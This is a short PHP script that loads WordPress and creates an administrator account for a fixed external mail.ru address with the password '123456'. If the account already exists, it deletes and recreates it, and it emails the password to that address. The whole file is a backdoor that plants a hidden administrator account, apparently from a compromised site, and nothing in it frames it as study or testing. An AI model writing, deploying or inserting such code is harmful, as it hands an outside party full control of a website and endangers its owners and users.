<?php
require  'wp-load.php';
if( null == username_exists( 'babushkin_lelya1979@mail.ru' ) ) {

//    $password = wp_generate_password( 12, false );
    $password = '123456';
    $email_address = 'babushkin_lelya1979@mail.ru';
    $user_id = wp_create_user( $email_address, $password, $email_address );

    // Set the nickname
    wp_update_user(
        array(
            'ID'          =>    $user_id,
            'nickname'    =>    $email_address
        )
    );

    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );

    // Email the user
    wp_mail( $email_address, 'Welcome!', 'Your Password: ' . $password );
} else {
    $email_address = 'babushkin_lelya1979@mail.ru';
    $user_id = get_user_by('email', $email_address );
    wp_delete_user( $user_id->ID );

    $password = '123456';
    $email_address = 'babushkin_lelya1979@mail.ru';
    $user_id = wp_create_user( $email_address, $password, $email_address );

    // Set the nickname
    wp_update_user(
        array(
            'ID'          =>    $user_id,
            'nickname'    =>    $email_address
        )
    );

    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );

    // Email the user
    wp_mail( $email_address, 'Welcome!', 'Your Password: ' . $password );
}